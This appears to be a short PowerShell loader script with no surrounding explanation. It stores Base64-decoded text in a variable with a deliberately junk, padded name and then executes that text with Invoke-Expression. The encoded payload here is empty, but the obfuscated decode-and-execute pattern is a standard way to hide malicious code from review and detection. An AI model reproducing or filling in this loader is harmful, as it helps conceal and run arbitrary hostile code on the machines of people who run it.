$ASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYG = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(""))
Invoke-Expression $ASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYGASJF7087hD28C01H64Cm132864cnH1N947981UYOFSUGYSDOIGYOSDFUGJIYSDGYOSDFYGSODUFYGJSUFYG
